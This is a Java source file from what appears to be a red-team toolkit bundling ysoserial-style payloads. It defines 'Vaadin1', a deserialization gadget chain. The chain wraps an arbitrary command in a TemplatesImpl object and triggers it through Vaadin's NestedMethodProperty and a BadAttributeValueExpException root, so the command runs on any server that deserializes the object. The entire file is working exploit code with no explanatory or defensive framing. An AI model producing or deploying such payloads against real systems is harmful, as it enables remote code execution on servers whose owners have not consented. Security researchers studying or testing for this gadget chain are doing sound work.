package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.PayloadTest;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.JavaVersion;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

import javax.management.BadAttributeValueExpException;

@Dependencies({"com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14"})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Authors({Authors.KULLRICH})
public class Vaadin1 implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(command);
        PropertysetItem item = new PropertysetItem();

        NestedMethodProperty<Object> property = new NestedMethodProperty<Object>(templates, "outputProperties");
        item.addItemProperty("outputProperties", property);

        BadAttributeValueExpException root = new BadAttributeValueExpException("");
        Reflections.setFieldValue(root, "val", item);
        return root;
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Vaadin1.class, args);
    }
}
